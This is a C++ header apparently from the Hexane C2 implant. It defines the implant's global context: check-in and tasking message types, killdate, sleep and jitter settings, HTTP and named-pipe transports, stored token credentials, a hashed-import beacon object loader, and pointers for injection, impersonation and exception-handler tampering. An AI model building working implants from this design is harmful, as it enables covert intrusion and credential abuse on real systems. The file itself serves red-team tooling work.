#ifndef HEXANE_MONOLITH_HPP
#define HEXANE_MONOLITH_HPP
#include <core/ntimports.hpp>
#include <core/include/names.hpp>

EXTERN_C ULONG __instance;
EXTERN_C LPVOID InstStart();
EXTERN_C LPVOID InstEnd();


#define WIN_VERSION_UNKNOWN                         0
#define WIN_VERSION_XP                              1
#define WIN_VERSION_VISTA                           2
#define WIN_VERSION_2008                            3
#define WIN_VERSION_7                               4
#define WIN_VERSION_2008_R2                         5
#define WIN_VERSION_2012                            7
#define WIN_VERSION_8                               8
#define WIN_VERSION_8_1                             8.1
#define WIN_VERSION_2012_R2                         9
#define WIN_VERSION_10                              10
#define WIN_VERSION_2016_X                          11

#define MAX_PATH 								    260
#define PIPE_BUFFER_MAX  				            (64 * 1000 - 1)
#define MIN(a,b)								    (a < b ? a : b)

#define GLOBAL_OFFSET 								(U_PTR(InstStart()) + U_PTR( &__instance))
#define Ctx           								(R_CAST(_hexane*, C_DREF(GLOBAL_OFFSET)))

#define C_CAST(T,x) 								(const_cast<T>(x))
#define D_CAST(T,x) 								(dynamic_cast<T>(x))
#define S_CAST(T,x) 								(static_cast<T>(x))
#define R_CAST(T,x) 								(reinterpret_cast<T>(x))

#define B_PTR(x)								    (R_CAST(PBYTE, x))
#define C_PTR(x)                                    (R_CAST(LPVOID, x))
#define U_PTR(x)                                    (R_CAST(UINT_PTR, x))
#define C_DREF(x)                                   (*R_CAST(VOID**, x))
#define S_PTR(x)                                    (R_CAST(const char*, x))

#define FUNCTION								    __text(B)
#define __prototype(x)                              decltype(x) *x
#define __code_seg(x)							    __attribute__((used, section(x)))
#define __text(x) 								    __attribute__((used, section(".text$" #x "")))
#define DLL_EXPORT 								    __declspec(dllexport)

#define ntstatus 								    Ctx->teb->LastErrorValue
#define PS_ATTR_LIST_SIZE(n)					    (sizeof(PS_ATTRIBUTE_LIST) + (sizeof(PS_ATTRIBUTE) * (n - 1)))
#define MODULE_NAME(mod)						    (mod->BaseDllName.Buffer)

#define PEB_POINTER64							    (R_CAST(PPEB, __readgsqword(0x60)))
#define PEB_POINTER32							    (R_CAST(PPEB, __readfsdword(0x30)))
#define REG_PEB32(Ctx) 						        (R_CAST(LPVOID, R_CAST(ULONG_PTR, Ctx.Ebx) + 0x8))
#define REG_PEB64(Ctx) 						        (R_CAST(LPVOID, R_CAST(ULONG_PTR, Ctx.Rdx) + 0x10))

#define DOS_HEADER(base)                    		(R_CAST(PIMAGE_DOS_HEADER, base))
#define NT_HEADERS(base, dos)			    		(R_CAST(PIMAGE_NT_HEADERS, B_PTR(base) + dos->e_lfanew))
#define EXPORT_DIRECTORY(dos, nt)	        		(R_CAST(PIMAGE_EXPORT_DIRECTORY, (U_PTR(dos) + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)))
#define SECTION_HEADER(data, i)   		            (R_CAST(PIMAGE_SECTION_HEADER, U_PTR(data) + sizeof(IMAGE_FILE_HEADER) + U_PTR(sizeof(IMAGE_SECTION_HEADER) * i)))
#define RELOC_SECTION(buffer, section) 			    (R_CAST(_reloc*, C_PTR(U_PTR(buffer) + section->PointerToRelocations)))
#define SYMBOL_TABLE(buffer, nt_head) 				(R_CAST(_coff_symbol*, U_PTR(buffer) + nt_head->FileHeader.PointerToSymbolTable))
#define SEC_START(map, index)                       (U_PTR(B_PTR(map[index].address)))
#define SEC_END(map, index)                         (U_PTR(B_PTR(map[index].address) + map[index].size))

#define RVA(Ty, base, rva)  			            (R_CAST(Ty, U_PTR(base) + rva))
#define NtCurrentProcess()              	        (R_CAST(HANDLE, S_CAST(LONG_PTR, -1)))
#define NtCurrentThread()               	        (R_CAST(HANDLE, S_CAST(LONG_PTR, -2)))

#define ARRAY_LEN(ptr) 				                sizeof(ptr) / sizeof(ptr[0])
#define PAGE_ALIGN(x)  				                (B_PTR(U_PTR(x) + ((4096 - (U_PTR(x) & (4096 - 1))) % 4096)))
#define DYN_ARRAY_LEN(i, ptr) 			            while (true) { if (!ptr[i]) { if (i > 0) { i -= 1; } break; __asm(""); } else { i++; }}
#define SIZEOF_SECTIONS(file_head) 					file_head.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)
#define RANGE(x, start, end) 						(x >= start && x < end)

// todo: hash COFF_PREP_SYMBOL, BEACON_SYMBOL and GLOBAL_CONTEXT names
#ifdef _M_X64
	#define IP_REG								    Rip
	#define ENTRYPOINT_REG 						    Rcx
	#define PTR_MASK                    		    0x7FFFFFFF
	#define PEB_POINTER     					    PEB_POINTER64
	#define REG_PEB_OFFSET(x) 					    REG_PEB64(x)
	#define DBG_FLAG_OFFSET 					    DBG_FLAG_OFFSET64
	#define IMAGE_OPT_MAGIC 					    IMAGE_NT_OPTIONAL_HDR64_MAGIC
	#define MACHINE_ARCH    					    IMAGE_FILE_MACHINE_AMD64

    #define COFF_PREP_SYMBOL                        0xec6ba2a8  // __imp_
    #define COFF_PREP_SYMBOL_SIZE                   6
    #define COFF_PREP_BEACON                        0xd0a409b0  // __imp_Beacon
    #define COFF_PREP_BEACON_SIZE                   (COFF_PREP_SYMBOL_SIZE + 6)
    #define COFF_INSTANCE                           0xbfded9c9  // .refptr.__instance
#elif _M_IX86
	#define IP_REG									Eip
	#define ENTRYPOINT_REG 							Eax
	#define PTR_MASK                    			0x7FFF
	#define PEB_POINTER     						PEB_POINTER32
	#define REG_PEB_OFFSET(x) 						REB_PEB32(x)
	#define DBG_FLAG_OFFSET 						DBG_FLAG_OFFSET32
	#define IMAGE_OPT_MAGIC 						IMAGE_NT_OPTIONAL_HDR32_MAGIC
	#define MACHINE_ARCH    						IMAGE_FILE_MACHINE_I386

    #define COFF_PREP_SYMBOL                        0x79dff807  // __imp__
    #define COFF_PREP_SYMBOL_SIZE                   7
    #define COFF_PREP_BEACON                        0x4c20aa4f  // __imp__Beacon
    #define COFF_PREP_BEACON_SIZE                   (COFF_PREP_SYMBOL_SIZE + 6)
    #define COFF_INSTANCE                           0xb341b5b9  // __instance
#endif

#define EGRESS 										0
#define INGRESS 									1
#define HEAP_NO_COMMIT							    0, 0, 0, 0, 0
#define DESKTOP_ENVIRONMENT_NULL				    0, 0, 0, 0, 0, 0, 0
#define SMB_SID_SINGLE_WORLD_SUBAUTHORITY		    SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0
#define SMB_RID_SINGLE_MANDATORY_LOW			    SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0
#define PROCESS_CREATE_ALL_ACCESS_SUSPEND		    PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, nullptr, nullptr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
#define IMAGE_SCN_MEM_RWX						    (IMAGE_SCN_MEM_EXECUTE |IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
#define IMAGE_SCN_MEM_RW						    (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
#define IMAGE_SCN_MEM_RX						    (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE)
#define IMAGE_SCN_MEM_WX						    (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)

#define UNMANAGED_PROCESS   					    0
#define MANAGED_PROCESS     					    1
#define ERROR_EXIT								    0x7FFFFFFF
#define DBG_FLAG_OFFSET64						    0x000000BC
#define DBG_FLAG_OFFSET32						    0x00000068
#define FLG_HEAP_ENABLE_TAIL_CHECK				    0x00000020
#define FLG_HEAP_ENABLE_FREE_CHECK				    0x00000040
#define FLG_HEAP_VALIDATE_PARAMETERS			    0x40000000
#define ADDRESS_MAX 								0xFFFFFFFFFFF70000
#define VM_MAX 										0x70000000

#define HEADER_SIZE 							    (sizeof(uint32_t) * 3)
#define SEGMENT_HEADER_SIZE 					    ((sizeof(uint32_t) * 6) + sizeof(uint32_t))
#define HTTP_REQUEST_MAX 						    0x300000

#define THREAD_CREATE_FLAGS_NONE                  	0x00000000
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED      	0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH    	0x00000002
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER    	0x00000004
#define THREAD_CREATE_FLAGS_LOADER_WORKER         	0x00000010
#define THREAD_CREATE_FLAGS_SKIP_LOADER_INIT      	0x00000020
#define THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE 	0x00000040

#define DEFAULT_SECTION_SIZE	                    0x1000
#define DEFAULT_BUFFLEN			                    0x0400

#ifdef TRANSPORT_PIPE
#define MESSAGE_MAX PIPE_BUFFER_MAX
#else
#define MESSAGE_MAX HTTP_REQUEST_MAX
#endif

#define ZeroFreePtr(x, n) 		                	x_memset(x, 0, n); x_free(x); x = nullptr
#define x_malloc(size) 			                	Ctx->nt.RtlAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, size)
#define x_realloc(ptr, size) 	                	Ctx->nt.RtlReAllocateHeap(Ctx->heap, HEAP_ZERO_MEMORY, ptr, size)
#define x_free(size) 			                	Ctx->nt.RtlFreeHeap(Ctx->heap, 0, size)

#define x_assert(x)     							if (!(x)) goto defer
#define x_assertb(x) 								if (!(x)) { success = false; goto defer; }
#define x_ntassert(x)   							ntstatus = x; if (!NT_SUCCESS(ntstatus)) goto defer
#define x_ntassertb(x)   							ntstatus = x; if (!NT_SUCCESS(ntstatus)) { success = false; goto defer; }

#define F_PTR_HMOD(Fn, hmod, sym_hash)				(Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(hmod, sym_hash))
#define F_PTR_HASHES(Fn, mod_hash, sym_hash)		(Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash))
#define C_PTR_HASHES(Fn, mod_hash, sym_hash)		(Fn = (void*) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash))
#define M_PTR(mod_hash)								Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash))
#define NT_ASSERT(Fn)								Fn; if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return

#define RANDOM_SELECT(ptr, arr)                 	auto a = 0; DYN_ARRAY_LEN(a, arr); ptr = arr[a % Utils::Random::RandomNumber32()]

#define return_defer(x)			                	ntstatus = x; goto defer
#define success_(x)				                	success = x; goto defer

#if	defined(__GNUC__) || defined(__GNUG__)
#define __builtin_bswap32 __bswapd
#define __builtin_bswap64 __bswapq
#endif

#define InitializeObjectAttributes(ptr, name, attr, root, sec )	\
    (ptr)->Length = sizeof( OBJECT_ATTRIBUTES );				\
    (ptr)->RootDirectory = root;								\
    (ptr)->Attributes = attr;									\
    (ptr)->ObjectName = name;									\
    (ptr)->SecurityDescriptor = sec;							\
    (ptr)->SecurityQualityOfService = NULL


typedef NTSTATUS(NTAPI* NtReadVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE processHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE processHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef NTSTATUS(NTAPI* NtQueryVirtualMemory_t)(HANDLE processHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(HANDLE processHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
typedef NTSTATUS(NTAPI* NtCreateSection_t)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(HANDLE SectionHandle, HANDLE processHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t) (HANDLE processHandle, PVOID BaseAddress);
typedef HRESULT(NTAPI* CLRCreateInstance_t)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);

typedef PVOID(NTAPI* RtlCreateHeap_t)(ULONG Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PRTL_HEAP_PARAMETERS Parameters);
typedef PVOID(NTAPI* RtlAllocateHeap_t)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
typedef PVOID(NTAPI* RtlReAllocateHeap_t)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress, SIZE_T Size);
typedef PVOID(NTAPI* RtlDestroyHeap_t)(PVOID HeapHandle);
typedef LOGICAL(NTAPI* RtlFreeHeap_t)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);

typedef NTSTATUS(NTAPI* NtOpenProcess_t)(PHANDLE hProcess, ACCESS_MASK dwDesiredAccess, POBJECT_ATTRIBUTES objectAttributes, PCLIENT_ID ClientId);
typedef NTSTATUS(NTAPI* NtTerminateProcess_t)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
typedef NTSTATUS(NTAPI* NtOpenProcessToken_t)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI* NtOpenThreadToken_t)(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI* NtDuplicateToken_t)(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly, TOKEN_TYPE Type, PHANDLE NewTokenHandle);
typedef NTSTATUS(NTAPI* NtDuplicateObject_t)(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
typedef NTSTATUS(NTAPI* NtOpenThread_t)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PUSER_THREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
typedef NTSTATUS(NTAPI* NtTerminateThread_t)(HANDLE ThreadHandle, NTSTATUS ExitStatus);

typedef NTSTATUS (NTAPI* NtDeviceIoControlFile_t)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
typedef NTSTATUS (NTAPI* NtOpenFile_t)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions);
typedef NTSTATUS(NTAPI* NtQueryInformationToken_t)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* NtCreateUserProcess_t)(PHANDLE processHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParams, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST ProcessAttributeList);
typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength);
typedef NTSTATUS(NTAPI* RtlCreateProcessParametersEx_t)(PRTL_USER_PROCESS_PARAMETERS* params, PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* RtlDestroyProcessParameters_t)(PRTL_USER_PROCESS_PARAMETERS procParams);
typedef NTSTATUS (NTAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW lpVersionInformation);
typedef ULONG (NTAPI* RtlRandomEx_t)(PULONG Seed);

typedef BOOL (WINAPI* SetProcessValidCallTargets_t)(HANDLE hProcess, PVOID VirtualAddress, SIZE_T RegionSize, ULONG NumberOfOffsets, PCFG_CALL_TARGET_INFO OffsetInformation);
typedef PVOID (NTAPI* RtlAddVectoredExceptionHandler_t)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
typedef ULONG (NTAPI* RtlRemoveVectoredExceptionHandler_t)(PVOID Handle);
typedef NTSTATUS(NTAPI* NtGetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
typedef NTSTATUS(NTAPI* NtSetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
typedef NTSTATUS(NTAPI* NtResumeThread_t)(HANDLE hThr, PULONG PrviousSuspendCount);
typedef NTSTATUS(NTAPI* NtWaitForSingleObject_t)(HANDLE Handle, BOOLEAN Alertable, ULONG Timeout);
typedef NTSTATUS(NTAPI* NtClose_t)(HANDLE hObject);
typedef VOID(NTAPI* RtlInitUnicodeString_t)(PUNICODE_STRING Destinationstring, PCWSTR Sourcestring);
typedef NTSTATUS (NTAPI* NtTestAlert_t)(void);
typedef NTSTATUS (NTAPI* TpAllocWork_t)(PTP_WORK* ptpWork, PTP_WORK_CALLBACK callback, PVOID optArgs, PTP_CALLBACK_ENVIRON cbEnviron);
typedef VOID (NTAPI* TpPostWork_t)(PTP_WORK ptpWork);
typedef VOID (NTAPI* TpReleaseWork_t)(PTP_WORK ptpWork);


enum MessageType {
	TypeCheckin     = 0x7FFFFFFF,
	TypeTasking     = 0x7FFFFFFE,
	TypeResponse    = 0x7FFFFFFD,
	TypeSegment     = 0x7FFFFFFC,
    TypeExecute     = 0x7FFFFFFB,
    TypeError		= 0x7FFFFFFA,
};

enum DX_MEMORY {
	DX_MEM_DEFAULT  = 0,
	DX_MEM_WIN32    = 1,
	DX_MEM_SYSCALL  = 2,
};

struct _object_map {
	PBYTE 	address;
	SIZE_T 	size;
};

struct _coff_symbol {
	union {
		CHAR    Name[8];
		UINT32  Value[2];
	} First;

	UINT32 Value;
	UINT16 SectionNumber;
	UINT16 Type;
	UINT8  StorageClass;
	UINT8  NumberOfAuxSymbols;
};

struct _reloc {
	UINT32 VirtualAddress;
	UINT32 SymbolTableIndex;
	UINT16 Type;
};

struct _executable {
	PBYTE					buffer;
	PIMAGE_DOS_HEADER		dos_head;
	PIMAGE_NT_HEADERS		nt_head;
	LPVOID					base;

	IMAGE_SECTION_HEADER 	*section;
	IMAGE_EXPORT_DIRECTORY 	*exports;
	SIZE_T 					size;

	uint32_t				task_id;
	_reloc 					*reloc;
	_symbol 				*symbol;
	_object_map 			*fn_map;
	_object_map 			*sec_map;
	_executable 			*next;

	HANDLE 					heap;
	HANDLE 					handle;
	HANDLE 					thread;
	PS_ATTRIBUTE_LIST 		*attrs;
	RTL_USER_PROCESS_PARAMETERS *params;
	PS_CREATE_INFO 			create;
};

typedef struct {
	PVOID  buffer;
	UINT32 length;
} BUFFER;

struct _mbs_buffer {
	LPSTR 	buffer;
	ULONG 	length;
};

struct _wcs_buffer {
	LPWSTR 	buffer;
	ULONG 	length;
};

struct _resource {
    LPVOID  res_lock;
    HGLOBAL h_global;
    SIZE_T  size;
};

struct _proxy {
	LPWSTR	address;
	LPWSTR	username;
	LPWSTR	password;
};

struct _http_context {
	HINTERNET 	handle;
	LPWSTR  	useragent;
	LPWSTR  	method;
	LPWSTR		address;
	INT 		port;
	LPCWSTR		accept;
	ULONG		access;
	ULONG 		flags;
	INT 		n_endpoints;
	LPWSTR		*endpoints;
	LPWSTR		*headers;
	_proxy		*proxy;
};

struct _token_list_data {
	HANDLE  handle;
	LPWSTR  domain_user;
	DWORD   pid;
	SHORT   type;

	LPWSTR   username;
	LPWSTR   password;
	LPWSTR   domain;

	_token_list_data* Next;
};

struct _parser {
	LPVOID 	handle;
    LPVOID  buffer;
	ULONG 	Length;
	BOOL 	little;
};

typedef struct {
	PSID	sid;
	PSID	sid_low;
	PACL	p_acl;
	PSECURITY_DESCRIPTOR sec_desc;
} SMB_PIPE_SEC_ATTR, *PSMB_PIPE_SEC_ATTR;


typedef void (*_command)(_parser *args);
typedef void (*obj_entry)(char* args, uint32_t size);

struct _command_map{
	DWORD    	name;
	_command 	address;
};

struct _hash_map{
	DWORD	name;
	LPVOID	address;
};

struct LdrpVectorHandlerEntry {
    LdrpVectorHandlerEntry 		*flink;
    LdrpVectorHandlerEntry 		*blink;
    uint64_t 					unknown1;
    uint64_t 					unknown2;
    PVECTORED_EXCEPTION_HANDLER handler;
};

struct LdrpVectorHandlerList {
    LdrpVectorHandlerEntry *first;
    LdrpVectorHandlerEntry *last;
    SRWLOCK 				lock;
};

struct _client {
	DWORD 	peer_id;
	HANDLE 	pipe_handle;
	LPWSTR 	pipe_name;
	_client *next;
};

struct _heap_info {
    ULONG_PTR heap_id;
    DWORD pid;
};

struct _u32_block {
    DWORD v0;
    DWORD v1;
};

struct _ciphertext {
    DWORD table[64];
};

struct _stream {
	BYTE 		inbound;
	ULONG   	peer_id;
	ULONG   	task_id;
	ULONG   	msg_type;
	ULONG		length;
	PBYTE		buffer;
	BOOL 		ready;
	_stream  	*next;
};

struct _hexane{

	PTEB 	teb;
	LPVOID 	heap;
	BOOL 	root;
    BOOL   	little;
	_executable *coffs;
	_client 	*clients;

	struct {
		UINT_PTR   	address;
		DWORD		size;
	} base;

	struct {
		HMODULE ntdll;
		HMODULE kernel32;
		HMODULE crypt32;
		HMODULE winhttp;
		HMODULE advapi;
		HMODULE iphlpapi;
		HMODULE mscoree;
		HMODULE kernbase;
	} modules;

	struct {
		PBYTE	key;
		ULONG64	killdate;
		LPSTR	hostname;
		ULONG	sleeptime;
		ULONG	jitter;
		ULONG 	hours;
	} config;

	struct {
		ULONG	ppid;
		ULONG	pid;
		ULONG	tid;
		ULONG	version;
		ULONG	current_taskid;
        ULONG	peer_id;
		WORD	arch;
		INT		retry;
		BOOL	checkin;
	} session;

	struct {
		_http_context 	*http;
		_stream        	*outbound_queue;
		HANDLE		    pipe_handle;
		LPWSTR		    pipe_name;
		LPSTR 		    domain;
		LPVOID	    	env_proxy;
		SIZE_T	    	env_proxylen;
		BOOL  	    	b_ssl;
		BOOL	    	b_proxy;
		BOOL	    	b_envproxy;
		BOOL	    	b_envproxy_check;
	} transport;

	struct {
		NtFreeVirtualMemory_t NtFreeVirtualMemory;
		NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
		NtProtectVirtualMemory_t NtProtectVirtualMemory;
		NtReadVirtualMemory_t NtReadVirtualMemory;
		NtWriteVirtualMemory_t NtWriteVirtualMemory;
		NtQueryVirtualMemory_t NtQueryVirtualMemory;
		NtCreateSection_t NtCreateSection;
		NtMapViewOfSection_t NtMapViewOfSection;
		NtUnmapViewOfSection_t NtUnmapViewOfSection;

		NtOpenProcess_t NtOpenProcess;
		NtCreateUserProcess_t NtCreateUserProcess;
		NtTerminateProcess_t NtTerminateProcess;
		RtlCreateProcessParametersEx_t RtlCreateProcessParametersEx;
		RtlDestroyProcessParameters_t RtlDestroyProcessParameters;
		NtOpenProcessToken_t NtOpenProcessToken;
        NtOpenThreadToken_t NtOpenThreadToken;
		NtDuplicateToken_t NtDuplicateToken;
		NtDuplicateObject_t NtDuplicateObject;
		NtQueryInformationToken_t NtQueryInformationToken;
		NtQueryInformationProcess_t NtQueryInformationProcess;

		RtlCreateHeap_t RtlCreateHeap;
		RtlAllocateHeap_t RtlAllocateHeap;
		RtlReAllocateHeap_t RtlReAllocateHeap;
		RtlFreeHeap_t RtlFreeHeap;
		RtlDestroyHeap_t RtlDestroyHeap;
		RtlInitUnicodeString_t RtlInitUnicodeString;

		RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler;
		RtlRemoveVectoredExceptionHandler_t RtlRemoveVectoredExceptionHandler;
		NtCreateThreadEx_t NtCreateThreadEx;
		NtOpenThread_t NtOpenThread;
		NtTerminateThread_t NtTerminateThread;

		RtlRandomEx_t RtlRandomEx;
		NtResumeThread_t NtResumeThread;
		NtGetContextThread_t NtGetContextThread;
		NtSetContextThread_t NtSetContextThread;
		NtSetInformationThread_t NtSetInformationThread;
		NtWaitForSingleObject_t NtWaitForSingleObject;

		TpAllocWork_t TpAllocWork;
		TpPostWork_t TpPostWork;
		TpReleaseWork_t TpReleaseWork;
		NtTestAlert_t NtTestAlert;
		NtClose_t NtClose;

		RtlGetVersion_t RtlGetVersion;
		NtQuerySystemInformation_t NtQuerySystemInformation;
        SetProcessValidCallTargets_t SetProcessValidCallTargets;
		NtDeviceIoControlFile_t NtDeviceIoControlFile;
		NtOpenFile_t NtOpenFile;

		CLRCreateInstance_t CLRCreateInstance;
	} nt;

	struct {
		__prototype(LoadLibraryA);
		__prototype(FreeLibrary);
		__prototype(Heap32ListFirst);
		__prototype(Heap32ListNext);
		__prototype(GetProcessHeap);
		__prototype(GetProcessHeaps);
		__prototype(GetProcAddress);
		__prototype(GetModuleHandleA);

		__prototype(IsWow64Process);
        __prototype(OpenProcess);
		__prototype(CreateToolhelp32Snapshot);
		__prototype(Process32First);
		__prototype(Process32Next);
        __prototype(Module32First);
        __prototype(Module32Next);
		__prototype(GetCurrentProcessId);
		__prototype(GetProcessId);
		__prototype(ImpersonateLoggedOnUser);
		__prototype(AdjustTokenPrivileges);

		__prototype(GlobalMemoryStatusEx);
		__prototype(GetComputerNameExA);
		__prototype(SetLastError);
		__prototype(GetLastError);

        __prototype(RegOpenKeyExA);
        __prototype(RegCreateKeyExA);
        __prototype(RegSetValueExA);
        __prototype(RegCloseKey);

		__prototype(ReadFile);
		__prototype(WriteFile);
		__prototype(CreateFileW);
		__prototype(GetFileSizeEx);
        __prototype(SetFilePointer);
		__prototype(GetFullPathNameA);
		__prototype(FindFirstFileA);
		__prototype(FindClose);
		__prototype(FindNextFileA);
		__prototype(GetCurrentDirectoryA);
		__prototype(FileTimeToSystemTime);
		__prototype(SystemTimeToTzSpecificLocalTime);
		__prototype(GetLocalTime);
		__prototype(GetSystemTimeAsFileTime);

		__prototype(FormatMessageA);
		__prototype(CreateRemoteThread);
		__prototype(CreateThread);
		__prototype(ExitThread);
		__prototype(QueueUserAPC);
		__prototype(GetThreadLocale);
		__prototype(SleepEx);

		__prototype(WinHttpOpen);
		__prototype(WinHttpConnect);
		__prototype(WinHttpOpenRequest);
		__prototype(WinHttpAddRequestHeaders);
		__prototype(WinHttpSetOption);
		__prototype(WinHttpGetProxyForUrl);
		__prototype(WinHttpGetIEProxyConfigForCurrentUser);
		__prototype(WinHttpSendRequest);
		__prototype(WinHttpReceiveResponse);
		__prototype(WinHttpReadData);
		__prototype(WinHttpQueryHeaders);
		__prototype(WinHttpQueryDataAvailable);
		__prototype(WinHttpCloseHandle);
		__prototype(GetAdaptersInfo);

		__prototype(CryptStringToBinaryA);
		__prototype(CryptBinaryToStringA);
		__prototype(FindResourceA);
		__prototype(LoadResource);
		__prototype(LockResource);
		__prototype(SizeofResource);
		__prototype(FreeResource);

		__prototype(CallNamedPipeW);
		__prototype(CreateNamedPipeW);
		__prototype(WaitNamedPipeW);
		__prototype(SetNamedPipeHandleState);
		__prototype(ConnectNamedPipe);
		__prototype(TransactNamedPipe);
		__prototype(DisconnectNamedPipe);
		__prototype(PeekNamedPipe);

		__prototype(GetUserNameA);
		__prototype(LookupAccountSidW);
		__prototype(LookupPrivilegeValueA);
		__prototype(SetEntriesInAclA);
		__prototype(AllocateAndInitializeSid);
		__prototype(AddMandatoryAce);
		__prototype(InitializeSecurityDescriptor);
		__prototype(SetSecurityDescriptorDacl);
		__prototype(SetSecurityDescriptorSacl);
		__prototype(InitializeAcl);
		__prototype(FreeSid);
	} win32;
};

#endif
